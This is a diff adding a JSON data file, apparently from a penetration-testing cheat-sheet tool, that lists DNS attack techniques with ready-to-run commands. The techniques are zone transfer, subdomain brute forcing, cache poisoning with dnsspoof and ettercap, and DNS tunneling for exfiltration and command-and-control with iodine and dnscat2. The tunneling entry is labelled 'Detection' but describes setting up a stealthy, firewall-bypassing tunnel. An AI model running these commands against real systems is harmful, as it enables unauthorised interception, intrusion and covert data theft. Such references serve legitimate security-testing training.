@@ -1,0 +1,136 @@
+{
+    "name": "DNS - Domain Name System",
+    "port": 53,
+    "description": "DNS server exploitation and enumeration",
+    "icon": "🌍",
+    "techniques": [
+        {
+            "id": "dns-1",
+            "name": "Zone Transfer (AXFR)",
+            "difficulty": "Beginner",
+            "description": "Request complete DNS zone copy from misconfigured servers",
+            "steps": [
+                "Identify DNS servers for target domain",
+                "Attempt zone transfer",
+                "Analyze discovered records"
+            ],
+            "commands": [
+                {
+                    "tool": "dig",
+                    "command": "dig axfr @<dns_server> <domain>",
+                    "description": "Attempt zone transfer with dig"
+                },
+                {
+                    "tool": "host",
+                    "command": "host -l <domain> <dns_server>",
+                    "description": "Zone transfer with host command"
+                },
+                {
+                    "tool": "nslookup",
+                    "command": "nslookup -type=any <domain>",
+                    "description": "Query all record types"
+                },
+                {
+                    "tool": "dnsrecon",
+                    "command": "dnsrecon -d <domain> -t axfr",
+                    "description": "Automated zone transfer"
+                }
+            ],
+            "tips": [
+                "Most modern servers block zone transfers",
+                "Internal DNS servers often misconfigured"
+            ]
+        },
+        {
+            "id": "dns-2",
+            "name": "Subdomain Enumeration",
+            "difficulty": "Beginner",
+            "description": "Discover subdomains through various techniques",
+            "steps": [
+                "Use passive sources",
+                "Brute force common subdomains",
+                "Verify discovered hosts"
+            ],
+            "commands": [
+                {
+                    "tool": "Sublist3r",
+                    "command": "sublist3r -d <domain>",
+                    "description": "Passive subdomain discovery"
+                },
+                {
+                    "tool": "Amass",
+                    "command": "amass enum -d <domain>",
+                    "description": "Comprehensive subdomain enumeration"
+                },
+                {
+                    "tool": "ffuf",
+                    "command": "ffuf -u http://FUZZ.<domain> -w subdomains.txt",
+                    "description": "Brute force subdomains"
+                },
+                {
+                    "tool": "dnsrecon",
+                    "command": "dnsrecon -d <domain> -D wordlist.txt -t brt",
+                    "description": "DNS brute forcing"
+                }
+            ],
+            "tips": [
+                "Combine multiple tools for coverage",
+                "Check certificate transparency logs"
+            ]
+        },
+        {
+            "id": "dns-3",
+            "name": "DNS Cache Poisoning",
+            "difficulty": "Advanced",
+            "description": "Inject malicious DNS records into cache",
+            "steps": [
+                "Identify vulnerable DNS resolver",
+                "Generate flood of forged responses",
+                "Wait for cache pollution"
+            ],
+            "commands": [
+                {
+                    "tool": "dnsspoof",
+                    "command": "dnsspoof -i eth0 host <target>",
+                    "description": "Simple DNS spoofing"
+                },
+                {
+                    "tool": "Ettercap",
+                    "command": "ettercap -T -q -i eth0 -P dns_spoof",
+                    "description": "DNS spoofing with Ettercap"
+                }
+            ],
+            "tips": [
+                "Requires network positioning",
+                "Modern DNS uses randomization to prevent this"
+            ]
+        },
+        {
+            "id": "dns-4",
+            "name": "DNS Tunneling Detection",
+            "difficulty": "Advanced",
+            "description": "Use DNS for data exfiltration or C2 communication",
+            "steps": [
+                "Set up DNS tunnel server",
+                "Configure client on target",
+                "Tunnel traffic through DNS"
+            ],
+            "commands": [
+                {
+                    "tool": "iodine",
+                    "command": "iodine -f <server_ip> tunnel.yourdomain.com",
+                    "description": "DNS tunnel client"
+                },
+                {
+                    "tool": "dnscat2",
+                    "command": "dnscat2 <domain>",
+                    "description": "DNS C2 channel"
+                }
+            ],
+            "tips": [
+                "Bypasses most firewalls",
+                "Can be slow but very stealthy"
+            ]
+        }
+    ]
+}
